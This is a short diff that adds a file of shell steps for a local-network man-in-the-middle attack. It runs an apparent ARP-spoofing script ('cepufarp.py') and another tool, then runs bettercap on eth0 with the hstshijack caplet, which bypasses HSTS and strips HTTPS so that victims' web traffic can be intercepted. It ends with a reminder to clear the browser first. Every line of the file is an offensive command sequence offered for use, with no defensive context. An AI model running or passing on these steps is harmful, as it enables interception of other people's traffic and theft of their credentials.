@@ -1,0 +1,10 @@
+cd kardusceniper/
+python kardusceniper.py
+
+cd cepufarp/
+python cepufarp.py
+
+cd root
+bettercap -iface eth0 -caplet hstshijack/hstshijack
+
+(clearbrowsingdulu)
